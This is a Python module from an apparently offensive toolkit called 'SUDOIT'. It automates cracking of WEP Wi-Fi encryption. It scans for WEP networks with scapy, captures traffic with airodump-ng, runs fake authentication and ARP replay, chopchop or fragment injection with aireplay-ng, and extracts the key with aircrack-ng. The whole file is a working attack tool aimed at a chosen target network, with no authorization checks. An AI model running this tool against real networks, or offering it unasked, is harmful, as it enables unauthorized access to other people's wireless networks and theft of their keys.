#!/usr/bin/env python3
"""
SUDOIT WEP Cracking Module
Legacy WEP encryption cracking for older networks.
"""

import os
import time
import subprocess
import re
from datetime import datetime
from typing import Optional, Dict, Tuple

try:
    from core.logger import get_logger
except ImportError:
    import logging
    def get_logger(name="SUDOIT"):
        return logging.getLogger(name)


class WEPCracker:
    """
    WEP Encryption Cracking Module.
    
    Features:
        - ARP replay attack
        - Fake authentication
        - IVs capture
        - aircrack-ng cracking
        - Multiple attack methods
        - Automatic key extraction
    """
    
    def __init__(self, interface: str = "wlan0mon", logger=None):
        self.interface = interface
        self.logger = logger or get_logger()
        self.running = False
        self._proc = None
        self._start_time = None
        self._ivs_captured = 0
    
    def crack(self, target_bssid: str, channel: int,
              output_prefix: Optional[str] = None,
              method: str = "auto",
              min_ivs: int = 10000,
              timeout: int = 600) -> Optional[str]:
        """
        Crack WEP encryption.
        
        Args:
            target_bssid: Target BSSID
            channel: WiFi channel
            output_prefix: Output file prefix
            method: Attack method (auto/arp/fakeauth/chopchop/fragment)
            min_ivs: Minimum IVs to capture
            timeout: Maximum attack time
        
        Returns:
            WEP key or None
        """
        self.logger.info(f"WEP crack started on {target_bssid}")
        self.running = True
        self._start_time = time.time()
        
        print(f"\n[*] WEP Cracking Attack")
        print(f"    Target:  {target_bssid}")
        print(f"    Channel: {channel}")
        print(f"    Method:  {method}")
        print(f"    Min IVs: {min_ivs}")
        print(f"    Timeout: {timeout}s\n")
        
        if not output_prefix:
            output_prefix = f"/tmp/sudoit_wep_{target_bssid.replace(':', '')}"
        
        # Set channel
        self._set_channel(channel)
        
        # Step 1: Start packet capture
        print("[*] Step 1: Starting packet capture...")
        capture_proc = self._start_capture(target_bssid, channel, output_prefix)
        time.sleep(2)
        
        # Step 2: Fake authentication
        if method in ["auto", "fakeauth"]:
            print("[*] Step 2: Fake authentication...")
            self._fake_auth(target_bssid)
            time.sleep(1)
        
        # Step 3: ARP replay or other attack
        if method in ["auto", "arp"]:
            print("[*] Step 3: Starting ARP replay...")
            self._arp_replay(target_bssid)
        elif method == "chopchop":
            print("[*] Step 3: ChopChop attack...")
            self._chopchop(target_bssid)
        elif method == "fragment":
            print("[*] Step 3: Fragment attack...")
            self._fragment(target_bssid)
        
        # Step 4: Wait for IVs
        print(f"[*] Step 4: Waiting for {min_ivs} IVs...")
        key = self._wait_for_ivs(output_prefix, min_ivs, timeout)
        
        # Cleanup
        self._cleanup()
        self.running = False
        
        if key:
            elapsed = time.time() - self._start_time if self._start_time else 0
            print(f"\n[✓] WEP KEY FOUND: {key}")
            print(f"    Time: {elapsed:.1f}s")
            print(f"    IVs:  {self._ivs_captured}")
            self.logger.info(f"WEP key cracked: {key}")
            return key
        else:
            print(f"\n[✗] WEP key not found")
            print(f"    Try increasing min_ivs or timeout")
            return None
    
    def _set_channel(self, channel: int):
        """Set wireless channel."""
        subprocess.run(
            ["iwconfig", self.interface, "channel", str(channel)],
            capture_output=True
        )
    
    def _start_capture(self, target_bssid: str, channel: int,
                       output_prefix: str) -> subprocess.Popen:
        """Start airodump-ng capture."""
        cmd = [
            "airodump-ng",
            "-c", str(channel),
            "--bssid", target_bssid,
            "-w", output_prefix,
            self.interface
        ]
        
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        return proc
    
    def _fake_auth(self, target_bssid: str):
        """Perform fake authentication to AP."""
        cmd = [
            "aireplay-ng",
            "-1", "0",
            "-a", target_bssid,
            self.interface
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            if "Association successful" in result.stdout:
                print("[✓] Fake authentication successful")
            else:
                print("[!] Fake authentication may have failed")
        except subprocess.TimeoutExpired:
            print("[!] Fake auth timeout")
    
    def _arp_replay(self, target_bssid: str):
        """Start ARP replay attack."""
        cmd = [
            "aireplay-ng",
            "-3",
            "-b", target_bssid,
            self.interface
        ]
        
        self._proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[*] ARP replay running...")
    
    def _chopchop(self, target_bssid: str):
        """ChopChop attack."""
        cmd = [
            "aireplay-ng",
            "-4",
            "-b", target_bssid,
            self.interface
        ]
        
        self._proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[*] ChopChop attack running...")
    
    def _fragment(self, target_bssid: str):
        """Fragment attack."""
        cmd = [
            "aireplay-ng",
            "-5",
            "-b", target_bssid,
            self.interface
        ]
        
        self._proc = subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print("[*] Fragment attack running...")
    
    def _wait_for_ivs(self, output_prefix: str, min_ivs: int, timeout: int) -> Optional[str]:
        """Wait for enough IVs and attempt cracking."""
        start = time.time()
        last_ivs = 0
        
        while time.time() - start < timeout:
            if not self.running:
                break
            
            time.sleep(5)
            
            # Check IVs count
            ivs_file = f"{output_prefix}-01.ivs"
            cap_file = f"{output_prefix}-01.cap"
            
            # Count IVs from airodump output
            csv_file = f"{output_prefix}-01.csv"
            if os.path.isfile(csv_file):
                try:
                    with open(csv_file, 'r') as f:
                        content = f.read()
                        # Try to extract IV count
                        for line in content.split('\n'):
                            if 'IV' in line or 'iv' in line:
                                numbers = re.findall(r'(\d+)', line)
                                if numbers:
                                    self._ivs_captured = int(numbers[-1])
                except:
                    pass
            
            # Try cracking with current IVs
            if self._ivs_captured > last_ivs:
                last_ivs = self._ivs_captured
                print(f"  [*] IVs captured: {self._ivs_captured}")
            
            if self._ivs_captured >= min_ivs:
                print(f"  [*] Attempting crack with {self._ivs_captured} IVs...")
                
                crack_cmd = ["aircrack-ng", "-z", cap_file]
                try:
                    result = subprocess.run(
                        crack_cmd,
                        capture_output=True, text=True, timeout=30
                    )
                    
                    # Parse output for key
                    for line in result.stdout.split('\n'):
                        if "KEY FOUND" in line:
                            match = re.search(r'\[(.+?)\]', line)
                            if match:
                                return match.group(1)
                        
                        # Try hex key format
                        hex_match = re.search(r'([0-9A-Fa-f]{10,26})', line)
                        if hex_match and "KEY" in result.stdout:
                            return hex_match.group(1)
                            
                except subprocess.TimeoutExpired:
                    pass
        
        # Final crack attempt
        cap_file = f"{output_prefix}-01.cap"
        if os.path.isfile(cap_file):
            print("  [*] Final crack attempt...")
            crack_cmd = ["aircrack-ng", "-z", cap_file]
            try:
                result = subprocess.run(crack_cmd, capture_output=True, text=True, timeout=60)
                
                for line in result.stdout.split('\n'):
                    if "KEY FOUND" in line:
                        match = re.search(r'\[(.+?)\]', line)
                        if match:
                            return match.group(1)
            except:
                pass
        
        return None
    
    def scan_wep_networks(self, duration: int = 30) -> list:
        """
        Scan for WEP-encrypted networks.
        
        Returns:
            List of WEP network info
        """
        print(f"[*] Scanning for WEP networks ({duration}s)...")
        
        from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt
        wep_networks = []
        
        def handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                try:
                    cap = pkt[Dot11].cap
                    # WEP has privacy bit but no RSN
                    if cap & 0x0010:  # Privacy bit
                        has_rsn = False
                        elt = pkt.getlayer(Dot11Elt)
                        while elt:
                            if elt.ID == 48:  # RSN
                                has_rsn = True
                                break
                            elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None
                        
                        if not has_rsn:  # Likely WEP
                            bssid = pkt[Dot11].addr2
                            ssid = "<Hidden>"
                            if pkt.haslayer(Dot11Elt) and pkt[Dot11Elt].info:
                                try:
                                    ssid = pkt[Dot11Elt].info.decode('utf-8', errors='ignore')
                                except:
                                    pass
                            
                            if bssid not in [n['bssid'] for n in wep_networks]:
                                wep_networks.append({"bssid": bssid, "ssid": ssid})
                                print(f"  [WEP] {ssid} - {bssid}")
                except:
                    pass
        
        try:
            sniff(iface=self.interface, prn=handler, store=0, timeout=duration)
        except Exception as e:
            self.logger.error(f"WEP scan error: {e}")
        
        print(f"\n[*] Found {len(wep_networks)} WEP networks")
        return wep_networks
    
    def _cleanup(self):
        """Clean up processes."""
        if self._proc:
            try:
                self._proc.terminate()
            except:
                pass
        
        subprocess.run(["pkill", "-f", "aireplay-ng"], capture_output=True)
    
    def stop(self):
        """Stop WEP cracking."""
        self.running = False
        self._cleanup()
        self.logger.info("WEP cracking stopped")
    
    def is_running(self) -> bool:
        """Check if cracking is running."""
        return self.running
    
    def get_status(self) -> Dict:
        """Get current status."""
        return {
            "running": self.running,
            "ivs_captured": self._ivs_captured,
            "elapsed": time.time() - self._start_time if self._start_time else 0
        }
